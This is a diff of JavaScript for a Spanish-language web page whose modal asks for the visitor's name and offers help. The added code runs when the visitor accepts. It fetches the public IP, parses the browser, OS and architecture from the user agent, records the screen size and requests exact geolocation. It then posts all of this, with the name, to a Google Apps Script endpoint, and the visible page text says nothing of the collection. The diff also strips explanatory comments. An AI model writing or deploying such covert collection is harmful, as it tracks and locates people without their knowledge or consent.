@@ -185,10 +185,9 @@ window.addEventListener('DOMContentLoaded', () => {
 
   let nombreUsuario = "";
 
-  // Mostrar modal al cargar
   modal.show();
 
-  // Paso 1: Pregunta inicial
+  // Paso 1
   function pasarAPedirNombre() {
     body.innerHTML = `
       <p>Para ofrecerte un servicio más personalizado, necesitamos conocer tu nombre.</p>
@@ -203,7 +202,7 @@ window.addEventListener('DOMContentLoaded', () => {
   document.getElementById('siBtn').addEventListener('click', pasarAPedirNombre);
   document.getElementById('noBtn').addEventListener('click', pasarAPedirNombre);
 
-  // Paso 2: Pedir nombre
+  // Paso 2
   function agregarEventosPaso2() {
     document.getElementById('continuarNombreBtn').addEventListener('click', () => {
       const input = document.getElementById('nombreInput');
@@ -215,7 +214,6 @@ window.addEventListener('DOMContentLoaded', () => {
 
       body.innerHTML = `
         <p>Hola, <b>${nombreUsuario}</b>. Te ayudaremos a encontrar una solución a cualquier problema o inquietud que tengas.</p>
-        <p>Por favor ingresa a nuestro sitio web para poder ayudarte.</p>
         <p>¿Quieres que te ayudemos?</p>
       `;
       footer.innerHTML = `
@@ -226,11 +224,64 @@ window.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Paso 3: Confirmación final
+  // Parsear el userAgent
+  function parseUserAgent(ua) {
+    let navegador = "Desconocido", os = "Desconocido", arquitectura = "Desconocido";
+
+    if (ua.includes("Chrome")) navegador = "Chrome";
+    else if (ua.includes("Firefox")) navegador = "Firefox";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) navegador = "Safari";
+    else if (ua.includes("Edg")) navegador = "Edge";
+
+    if (ua.includes("Windows")) os = "Windows";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+    else if (ua.includes("Mac OS")) os = "MacOS";
+    else if (ua.includes("Linux")) os = "Linux";
+
+    if (ua.includes("Win64") || ua.includes("x86_64")) arquitectura = "64 bits";
+    else if (ua.includes("Win32") || ua.includes("x86")) arquitectura = "32 bits";
+
+    return { navegador, os, arquitectura };
+  }
+
+  // Paso 3
   function agregarEventosPaso3() {
     document.getElementById('aceptarBtn').addEventListener('click', () => {
+      // Sacar IP primero
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipResp => {
+          const ip = ipResp.ip;
+          const ua = navigator.userAgent;
+          const { navegador, os, arquitectura } = parseUserAgent(ua);
+          const resolucion = `${screen.width}x${screen.height}`;
+
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+              const data = {
+                nombre: nombreUsuario,
+                latitud: pos.coords.latitude,
+                longitud: pos.coords.longitude,
+                ip: ip,
+                dispositivo: ua,
+                navegador: navegador,
+                os: os,
+                arquitectura: arquitectura,
+                pantalla: resolucion
+              };
+
+              fetch('https://script.google.com/macros/s/AKfycbzRve8tjes69fOgwjRcFvV6m5nIOI50EFYefVJ7VnukRO_orutLPmTIFiLJs09xnCUI/exec', {
+                method: 'POST',
+                body: JSON.stringify(data)
+              })
+              .then(r => r.json())
+              .then(resp => console.log("Guardado en Sheet:", resp))
+              .catch(err => console.error("Error enviando a Sheet:", err));
+            });
+          }
+        });
       modal.hide();
-      // Aquí entra normalmente al sitio
     });
 
     document.getElementById('noGraciasBtn').addEventListener('click', () => {
